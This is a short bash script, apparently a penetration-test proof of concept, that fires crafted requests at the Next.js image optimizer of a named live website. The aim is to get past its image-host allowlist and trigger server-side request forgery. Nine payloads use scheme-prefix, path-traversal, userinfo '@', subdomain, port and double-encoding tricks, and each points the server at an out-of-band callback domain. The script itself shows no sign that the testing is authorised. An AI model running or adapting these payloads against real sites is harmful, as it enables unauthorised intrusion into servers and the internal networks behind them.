#!/bin/bash
# Allowlist-bypass + SSRF proof against the Next.js image optimizer.
# Each request hard-capped so a hanging fetch cannot stall the run.
T="https://www.infinitycapital.bh/_next/image"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
D=dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
H1=oob6b34bdd2eb55
H2=oobf137fe14194f

fire () {
  local label="$1"; local u="$2"
  local code
  code=$(timeout 20 curl -sk -A "$UA" -o /tmp/b -w "%{http_code}" -G "$T" --data-urlencode "url=$u" --data "w=640" --data "q=75")
  local sz=$(wc -c < /tmp/b 2>/dev/null || echo 0)
  echo "[$label] code=$code size=$sz"
}

fire "scheme_prefix_evil"    "https://images.ctfassets.net/https://$H1.$D/x.png"
fire "traverse_evil"         "https://images.ctfassets.net/../../$H1.$D/x.png"
fire "userinfo_at_evil"      "https://images.ctfassets.net@$H2.$D/a.png"
fire "direct_evil_sub"       "https://$H1.$D/a.png"
fire "direct_evil_com"       "https://$H1.$D/a.png"
fire "port_suffix"           "https://images.ctfassets.net:443@$H1.$D/a.png"
fire "subdomain_evil"        "https://images.ctfassets.net.$H1.$D/a.png"
fire "evil_as_path_ctf"      "https://images.ctfassets.net/$H1.$D/a.png"
fire "double_encoded"        "https://images.ctfassets.net/%252e%252e/$H1.$D/a.png"
echo "DONE"
